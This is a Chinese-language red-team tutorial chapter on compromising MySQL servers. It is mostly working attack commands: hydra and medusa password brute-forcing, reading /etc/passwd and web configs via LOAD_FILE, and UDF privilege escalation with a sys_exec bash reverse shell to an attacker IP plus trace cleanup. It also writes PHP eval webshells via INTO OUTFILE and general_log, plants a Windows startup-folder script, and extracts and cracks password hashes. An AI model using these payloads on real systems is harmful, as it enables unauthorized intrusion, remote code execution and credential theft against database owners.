# 02-MySQL渗透

> 前置：[[01-数据库渗透流程与探测|01章]] 已确认 3306 开放。MySQL 是红队最常遇到的库，提权路径最成熟。所需权限条件在各节标注。

## 目录
- [[#一、弱口令爆破|一、弱口令爆破]]
- [[#二、登录后信息收集SQL集|二、登录后信息收集SQL集]]
- [[#三、secure_file_priv与文件读写|三、secure_file_priv与文件读写]]
- [[#四、UDF提权全流程|四、UDF提权全流程]]
- [[#五、into outfile写webshell|五、into outfile写webshell]]
- [[#六、general_log写shell|六、general_log写shell]]
- [[#七、启动项写马|七、启动项写马]]
- [[#八、哈希提取与解密|八、哈希提取与解密]]

---

## 一、弱口令爆破

### 1.1 hydra

```bash
# 单目标爆破 root 用户（注意 MySQL 模块为 mysql）
hydra -l root -P /usr/share/wordlists/rockyou.txt <target> mysql

# 用户名字典 + 指定端口
hydra -L users.txt -P pass.txt -s 3306 <target> mysql

# 爆破成功后直接验证
mysql -h <target> -u root -p
```

### 1.2 medusa

```bash
medusa -h <target> -u root -P pass.txt -M mysql -t 10
```

### 1.3 常见弱口令字典表

| 账户 | 口令 | 出现场景 |
|------|------|---------|
| root | root | 测试环境 |
| root | 123456 | 运维习惯口令 |
| root | （空） | 本地开发配置遗留 |
| root | password / toor | 模板镜像默认值 |
| mysql | mysql | 低权限备份账户 |
| test | test | 遗留测试账户 |

---

## 二、登录后信息收集SQL集

```sql
-- 版本与当前用户
SELECT version();
SELECT user();
SELECT current_user();

-- 数据目录：写文件路径的关键
SELECT @@datadir;
-- 典型输出: /var/lib/mysql/

-- 插件目录：UDF 提权的目标位置
SELECT @@plugin_dir;
-- 典型输出: /usr/lib/mysql/plugin/

-- 文件读写限制：决定能不能 into outfile
SELECT @@secure_file_priv;

-- 是否 DBA 权限
SHOW GRANTS FOR CURRENT_USER();

-- 所有用户与认证串
SELECT user, host, authentication_string FROM mysql.user;
```

---

## 三、secure_file_priv与文件读写

`secure_file_priv` 决定 `LOAD_FILE()` 与 `INTO OUTFILE` 的行为：

| 值 | 影响 | 红队结论 |
|----|------|---------|
| `NULL` | 禁止一切文件读写 | 只能走 general_log 或 UDF 其他路径 |
| `/var/lib/mysql-files/` | 读写仅限该目录 | 写 webshell 失败，但可向该目录写 UDF so 再想办法加载 |
| 空（未设置） | 任意路径可读写 | **最佳情况**，直接 outfile 写马 |

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT LOAD_FILE('/etc/passwd');   -- 读文件测试（需 FILE 权限）
```

条件汇总：outfile 需要 `FILE` 权限 + `secure_file_priv` 不限制目标路径 + 目标路径对 mysqld 进程可写。

---

## 四、UDF提权全流程

**什么是 UDF：** User Defined Function，MySQL 允许通过共享库（so/dll）注册自定义函数。恶意 so 中包含 `sys_exec` 等函数，注册后即可以 **mysqld 进程身份**执行系统命令——Linux 上若服务以 root 运行，直接获得 root。

### 4.1 条件判断

| 条件 | 判断方法 | 说明 |
|------|---------|------|
| 有 FILE 权限 | `SHOW GRANTS;` | 写 so 必需 |
| secure_file_priv 可写 plugin_dir | 对比两个变量值 | MySQL 5.7+ 默认 NULL 时此路不通 |
| 知道 plugin_dir | `SELECT @@plugin_dir;` | 5.5 以下无插件目录概念，可写到 PATH 能找到的位置 |

版本差异：MySQL < 5.1 无 plugin_dir 校验，任意目录的 so 都能加载；5.1+ 强制要求 so 位于 plugin_dir 内。

### 4.2 全流程命令

```bash
# 1. 准备恶意 so（kali 自带 sqlmap 内有编译好的）
cp /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_64 ./udf.so
# Windows 用 lib_mysqludf_sys.dll_
```

```sql
-- 2. 写入 so 到 plugin_dir（十六进制方式绕过传输问题）
SELECT HEX(LOAD_FILE('/tmp/udf.so')) INTO @hex;   -- 先在本地算好 hex 更常见
SELECT UNHEX('<hex内容>') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 3. 创建函数
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';

-- 4. 执行系统命令（返回值是退出码）
SELECT sys_exec('id > /tmp/pwned');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/<攻击IP>/<PORT> 0>&1"');

-- 5. 清理痕迹
DROP FUNCTION sys_exec;
```

> mysqld 通常以 mysql 用户运行，此时拿到的是 mysql 权限而非 root；配合内核漏洞或 SUID 提权再进一步。

---

## 五、into outfile写webshell

### 5.1 条件

| 条件 | 说明 |
|------|------|
| FILE 权限且 secure_file_priv 为空 | 见第三节 |
| 知道 Web 绝对路径 | 报错信息、phpinfo、`@@datadir` 推测、常见路径字典爆破 |
| 路径可写 | Web 目录通常满足 |

### 5.2 路径确定方法

```sql
-- 读取服务器配置定位站点根目录
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
SELECT LOAD_FILE('C:/phpstudy/www/index.php');
```

报错回显、`load_file('/etc/passwd')` 配合日志路径、nginx 默认 `/usr/share/nginx/html` 都是常见突破口。

### 5.3 写马

```sql
SELECT '<?php eval($_REQUEST[cmd]);?>' 
INTO OUTFILE '/var/www/html/shell.php';

-- 利用分隔符写多行
SELECT '<?php @eval($_POST[1]);?>' 
INTO DUMPFILE '/var/www/html/info.php';
```

> `INTO OUTFILE` 会加换行符并转义，`DUMPFILE` 写单行原样内容；写 webshell 二者皆可。写入后用蚁剑/冰蝎连接，后续参见 [[../前端基础/php/03-危险函数与命令执行|PHP危险函数与命令执行]]。

---

## 六、general_log写shell

当 `secure_file_priv=NULL` 封死 outfile 时的替代方案：把查询日志当作 PHP 文件写，查询语句本身落盘成为 shell 内容。需要 SUPER 权限。

```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/log.php';
SELECT '<?php eval($_POST[cmd]);?>';      -- 该查询会被记录进 log.php
SET GLOBAL global_log = 'OFF';            -- 收尾还原，避免磁盘爆掉
SET GLOBAL general_log_file = '/var/lib/mysql/xxx.log';
```

限制：general_log_file 可以指定任意路径（不受 secure_file_priv 约束），但仍要求目标目录对 mysqld 可写。

---

## 七、启动项写马

Windows 场景补充一笔：mysqld 以 SYSTEM 或管理员运行时，outfile 写 VBS/bat 到启动目录实现重启触发：

```sql
SELECT '<bat内容>' INTO OUTFILE 'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/x.bat';
```

依赖重启时机，实战中优先级低于 UDF，仅在 outfile 可用而 UDF 被 WAF 拦时考虑。

---

## 八、哈希提取与解密

### 8.1 提取

```sql
-- MySQL 5.7+：authentication_string；5.x 早期为 Password 字段
SELECT user, host, authentication_string FROM mysql.user;
-- 输出格式: *A8F5D2... （41位，SHA1 双段，前缀星号）
```

### 8.2 解密

```bash
# hashcat 模式 300（MySQL 4.1+ 的 SHA1 格式，去掉星号小写）
hashcat -m 300 hash.txt rockyou.txt

# john 同样支持
john --format=mysql-sha1 hash.txt
```

格式细节与更多模式对照见 [[08-口令破解与哈希提取|08-口令破解与哈希提取]]。

---
**返回** [[数据库安全总目录|数据库安全 总目录]]
